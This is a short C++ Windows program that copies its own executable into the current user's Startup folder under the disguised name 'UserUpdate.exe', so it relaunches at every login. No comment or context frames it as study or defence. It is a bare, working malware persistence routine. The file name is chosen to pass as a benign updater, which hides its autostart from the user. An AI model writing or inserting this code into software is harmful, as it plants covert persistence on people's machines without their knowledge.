#include <Windows.h>
#include <string>

int main() {
    wchar_t currentExePath[MAX_PATH];
    GetModuleFileNameW(NULL, currentExePath, MAX_PATH);

    wchar_t appData[MAX_PATH];
    ExpandEnvironmentStringsW(L"%APPDATA%", appData, MAX_PATH);

    std::wstring dest = std::wstring(appData) + L"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\UserUpdate.exe";

    CopyFileW(currentExePath, dest.c_str(), FALSE);
}